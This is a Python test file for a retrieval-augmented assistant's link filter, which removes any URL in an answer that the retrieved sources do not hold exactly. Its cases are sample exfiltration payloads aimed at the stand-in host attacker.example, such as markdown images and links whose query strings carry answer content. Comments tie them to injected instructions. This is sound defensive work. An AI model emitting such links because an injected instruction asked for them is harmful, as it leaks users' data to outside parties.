"""Links in an answer: kept only when the sources hold exactly that URL."""

import pytest

from app.rag.context import Context, Source
from app.rag.links import REMOVED, remove_foreign_links, source_urls

PORTAL = "https://travel.acmecorp.example/book"


def context(*texts: str) -> Context:
    return Context(
        user_id=1,
        sources=tuple(
            Source(
                label=f"S{n}",
                document_id=n,
                document_title=f"Document {n}",
                document_version=1,
                chunk_ids=(n,),
                text=text,
                score=0.5,
            )
            for n, text in enumerate(texts, start=1)
        ),
        left_out=0,
    )


SOURCES = context(f"Book through the portal at {PORTAL}.", "Hotels are 160 EUR a night.")


@pytest.mark.parametrize(
    ("answer", "expected"),
    [
        # The image an injected instruction asks for, carrying the answer.
        (
            "Hotels are 160 EUR [S2]. ![status](https://attacker.example/c?d=160+EUR)",
            "Hotels are 160 EUR [S2]. status",
        ),
        ("See [the details](https://attacker.example/x) [S2].", "See the details [S2]."),
        ("Verify at https://attacker.example/v?q=hotel.", f"Verify at {REMOVED}."),
        ("Or www.attacker.example/v?q=hotel", f"Or {REMOVED}"),
        ("Mail mailto:out@attacker.example?body=160", f"Mail {REMOVED}"),
        ("Fetch ftp://attacker.example/f", f"Fetch {REMOVED}"),
        ('A titled ![x](https://attacker.example/i "t") image', "A titled x image"),
        ("An angled [x](<https://attacker.example/i>) link", "An angled x link"),
        (
            "A link inside the words [https://attacker.example](https://attacker.example)",
            f"A link inside the words {REMOVED}",
        ),
        ("HTTPS://ATTACKER.EXAMPLE/LOUD", REMOVED),
    ],
    ids=["image", "link", "bare", "www", "mailto", "ftp", "titled", "angled", "nested", "upper"],
)
def test_a_link_the_sources_dont_hold_is_taken_out(answer: str, expected: str) -> None:
    links = remove_foreign_links(answer, SOURCES)
    assert links.text == expected
    assert "attacker" not in links.text.lower()
    assert links.removed >= 1


def test_a_link_the_sources_hold_is_kept_as_it_is() -> None:
    for answer in (
        f"Book at {PORTAL} [S1].",
        f"Book through [the portal]({PORTAL}) [S1].",
        f"Book at <{PORTAL}>.",
    ):
        links = remove_foreign_links(answer, SOURCES)
        assert links.text == answer
        assert links.removed == 0


def test_an_image_is_taken_out_even_when_the_sources_hold_its_url() -> None:
    # Fetched without a click, it would tell the document's author someone was answered.
    links = remove_foreign_links(f"Here ![queue]({PORTAL}) it is.", SOURCES)
    assert links.text == "Here queue it is."
    assert links.removed == 1


def test_an_image_that_came_apart_leaves_no_image_behind() -> None:
    # A space in the payload stops the image being read as one, so only its URL is found.
    links = remove_foreign_links("End ![ok](https://attacker.example/p?d=160 EUR) here.", SOURCES)
    assert "![" not in links.text
    assert "attacker" not in links.text
    assert links.text == f"End [ok]({REMOVED} EUR) here."


def test_only_the_exact_url_counts() -> None:
    # Data added to an allowed link is what the attack is.
    for changed in (f"{PORTAL}?d=160", f"{PORTAL}/160", PORTAL.upper(), PORTAL[:-1]):
        links = remove_foreign_links(f"Go to {changed} now.", SOURCES)
        assert links.text == f"Go to {REMOVED} now."
        assert links.removed == 1


def test_a_citation_written_as_a_link_stays_a_citation() -> None:
    links = remove_foreign_links("Hotels are 160 EUR [S2](https://attacker.example/c).", SOURCES)
    assert links.text == "Hotels are 160 EUR [S2]."


def test_every_link_is_counted() -> None:
    answer = "a https://x.example/1 b [c](https://x.example/2) ![d](https://x.example/3)"
    links = remove_foreign_links(answer, SOURCES)
    assert links.removed == 3
    assert links.text == f"a {REMOVED} b c d"


def test_an_answer_without_links_is_unchanged() -> None:
    answer = "Hotels are 160 EUR a night [S2]. Mail expenses@acmecorp.example with questions."
    assert remove_foreign_links(answer, SOURCES) == remove_foreign_links(answer, context())
    assert remove_foreign_links(answer, SOURCES).text == answer
    assert remove_foreign_links(answer, SOURCES).removed == 0


def test_with_no_sources_no_link_is_allowed() -> None:
    assert remove_foreign_links(f"Book at {PORTAL}", context()).text == f"Book at {REMOVED}"


def test_the_urls_the_sources_hold() -> None:
    found = source_urls(context(f"See {PORTAL}, or www.acmecorp.example.", "No links here."))
    assert found == {PORTAL, "www.acmecorp.example"}
